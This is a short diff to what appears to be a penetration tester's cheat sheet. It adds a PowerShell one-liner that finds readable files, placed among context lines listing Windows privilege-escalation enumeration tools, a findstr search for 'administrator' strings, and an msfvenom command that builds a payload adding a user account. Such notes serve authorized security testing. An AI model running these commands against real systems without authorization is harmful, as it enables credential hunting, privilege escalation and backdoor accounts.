@@ -10,6 +10,7 @@ winpeas.exeFwifi
 powerup.ps1 invoke-allchecks
 dir \ /s/b | find ""
 findstr /sp administrator *
+Get-ChildItem -Recurse -File | ForEach-Object { try { Get-Content $_.FullName -TotalCount 1 -ErrorAction Stop >$null; $_ } catch {} }
 ```
 ### linux
 ```
@@ -291,6 +292,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
